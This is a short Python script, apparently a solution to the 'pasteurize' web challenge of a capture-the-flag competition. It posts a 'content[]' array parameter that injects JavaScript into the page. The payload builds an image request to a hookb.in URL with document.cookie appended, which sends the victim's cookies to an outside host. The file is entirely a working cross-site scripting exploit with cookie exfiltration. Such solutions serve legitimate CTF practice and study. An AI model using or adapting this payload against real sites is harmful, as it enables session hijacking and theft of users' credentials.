#!/usr/bin/env python3

import requests

url = "https://pasteurize.web.ctfcompetition.com/"

r = requests.post(url, data={
		"content[]": ";new Image().src='https://hookb.in/kxVkbwgD7OcrOOoLbem6?c='+document.cookie//"

	})

print(r.text)